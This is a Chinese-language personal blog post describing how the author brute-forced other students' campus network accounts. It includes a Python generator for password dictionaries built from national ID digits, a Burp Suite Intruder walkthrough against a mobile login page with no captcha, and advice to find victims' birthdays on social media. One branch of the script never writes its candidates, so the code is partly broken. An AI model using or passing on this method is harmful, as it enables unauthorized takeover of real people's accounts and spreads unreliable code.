---
layout:     post                    # 使用的布局（不需要改）
title:      My First Post               # 标题 
subtitle:   记一次对校园网账号的爆破 #副标题
date:       2019-05-18              # 时间
author:     Von                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - Practice
---
前言
---
  上个星期开始就试图对校园网账号进行爆破。当出现验证码后试图用tesserocr对其进行识别继续爆破。然而发现简单的识别识别不出来。本来tesserocr支持
机器学习，然而由于我的菜一直没搞懂，工程本来就此停滞。但是后来在手机上查询校园网流量余额时偶然发现查询流量的网站在移动端居然没有验证码验证。于
是想到可以对移动端进行抓包然后进行爆破。

准备工作
---
  由于校园账号的默认密码是身份证后六位。而身份证后六位的前两位是生日，倒数第二位是性别识别码。所以根据不同的人来生成不同的字典可以大大地提高
速度。由下我写了个python脚本可以根据不同的用户输入生成不同的字典。
```python
def Fun(birthday = '',gender = ''):
	File = 'DICT.txt'
	num = 0
	with open(File,'w') as f:
		if birthday :
			if gender :
				for i in range(0,100):
					STR1 = birthday.zfill(2) + str(i).zfill(2)
					if gender == 'Male':
						for j in range(1,10,2):
							STR2 = STR1 + str(j)
							for k in range(0,10):
								f.write(STR2 + str(k)+'\n')
								num += 1
							f.write(STR2 + 'X' +'\n')
							num += 1
					else:
						for j in range(0,10,2):
							STR2 = STR1 + str(j)
							for k in range(0,10):
								f.write(STR2 + str(k)+'\n')
								num += 1
							f.write(STR2 + 'X' +'\n')
							num += 1
			else :
				for i in range(0,1000):
					STR1 = birthday.zfill(2) + str(i).zfill(3)
					for j in range(0,10):
						STR2 = (STR1 + str(j) + '\n')
						num += 1
					f.write(STR1 + 'X' + '\n')
					num += 1
		else:
			if gender :
				for i in range(1,32):
					STR1 = str(i).zfill(2)
					for j in range(0,100):
						STR2 = STR1 + str(j).zfill(2)
						if gender == 'Male':
							for k in range(1,10,2):
								STR3 = STR2 + str(k)
								for l in range(0,10):
									f.write(STR3 + str(l) + '\n')
									num += 1
								f.write(STR3 + 'X' + '\n')
								num += 1
						else:
							for k in range(2,10,2):
								STR3 = STR2 + str(k)
								for l in range(0,10):
									f.write(STR3 + str(l) + '\n')
									num += 1
								f.write(STR3 + 'X' + '\n')
								num += 1
							
			else:
				for i in range(1,32):
					STR1 = str(i).zfill(2)
					for j in range(0,1000):
						STR2 = STR1 + str(j).zfill(3)
						for k in range(0,10):
							f.write(STR2 + str(k) + '\n')
							num += 1
						f.write(STR2 + 'X' + '\n')
						num += 1
	print('Dictionary generation was successful with a total number of '+str(num))
					
	
if __name__=='__main__':
	day = input('Please input the day: ')
	gender = input('Please input the gender(Male or Female): ')
	Fun(day,gender)	
```

实战爆破
---
  首先我们使用burpsuite对移动端进行抓包。关于对移动端进行抓包这里不做赘述（原理就是在同个局域网中让手机挂上PC端的代理）。然后让手机访问查询
校园网流量的网站[10.255.44.1:8800](10.255.44.1:8800).抓包所得结果如下:
![](http://VonLYC.github.io/img/BLOG1.png)
  我们可以看出，账号密码是进行明文传输，这给我们的工作提供了便利。我们右键，将其send to intruder.在Positions中将password添加为一个攻击点。
![](http://VonLYC.github.io/img/BLOG2.png)
  再在Payloads中选择我们生成的字典。
![](http://VonLYC.github.io/img/BLOG3.png)
  再在Options中选择线程(Professional版好像默认为5)。之后就可以Start Attack了。
![](http://VonLYC.github.io/img/BLOG4.png)
  接下来的事我们就只需要让burp suite自动完成了。我们只需要在Length中筛选出与其他不同的一项，其所对应的payload就是用户的密码。
![](http://VonLYC.github.io/img/BLOG5.png)
  一般来说,如果我们知道要破解账号的生日的话，生成的字典只有5500个payload，这样一般5分钟内可以得出密码。而如果不知道对方的生日，生成的字典的
payload则有100000+个，一般就需要1，2个小时才可以得出密码。所以如果结合社会工程学从对方QQ之类的东西获取到对方的生日则可以大大的提高效率。

总结
---
  这是我写的第一篇博客，技术含量不高。纯粹是为了记录一下这项小Practice。希望以后能够通过不断的学习正确多更一些高质量的文章吧。





